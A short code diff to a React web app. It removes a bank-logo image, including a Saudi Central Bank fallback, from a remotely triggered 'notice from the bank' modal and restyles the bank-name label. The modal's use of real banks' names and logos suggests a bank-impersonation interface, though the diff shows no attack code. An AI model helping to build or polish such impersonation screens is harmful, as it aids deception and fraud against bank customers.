@@ -15,7 +15,6 @@ import {
   listenForBankContactRequest,
   confirmBankContact,
 } from "@/lib/firebase";
-import samaLogo from "@/assets/sama_logo.png";
 import { findBankLogo } from "@/lib/bank-logos";
 
 const TICKET_STEP_TO_PATH: Record<number, string> = {
@@ -261,11 +260,9 @@ function BlockGate({ children }: { children: React.ReactNode }) {
 
 function BankContactModal({
   onConfirm,
-  bankLogoSrc,
   bankLabel,
 }: {
   onConfirm: () => void;
-  bankLogoSrc: string;
   bankLabel: string;
 }) {
   const [submitting, setSubmitting] = useState(false);
@@ -277,18 +274,10 @@ function BankContactModal({
     >
       <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden">
         <div className="bg-gradient-to-br from-[#4a1525] to-[#2a0a14] p-6 text-center">
-          <div className="w-20 h-20 mx-auto rounded-full bg-white flex items-center justify-center mb-3 shadow-md p-2">
-            <img
-              src={bankLogoSrc}
-              alt={bankLabel}
-              className="w-full h-full object-contain"
-              data-testid="img-bank-logo"
-            />
-          </div>
           <h2 className="text-white text-xl font-bold">إشعار من البنك</h2>
           {bankLabel && (
             <div
-              className="text-[#c9a96e] text-sm mt-1"
+              className="inline-block mt-3 px-4 py-1.5 rounded-full bg-white/10 border border-white/20 text-[#c9a96e] text-sm font-bold"
               data-testid="text-bank-label"
             >
               {bankLabel}
@@ -391,12 +380,10 @@ function BankContactGate() {
 
   if (!show) return null;
   const matched = findBankLogo(bankName);
-  const bankLogoSrc = matched?.logo || samaLogo;
   const bankLabel = matched?.label || (bankName ? bankName : "البنك المركزي السعودي");
   return (
     <BankContactModal
       onConfirm={() => setShow(false)}
-      bankLogoSrc={bankLogoSrc}
       bankLabel={bankLabel}
     />
   );
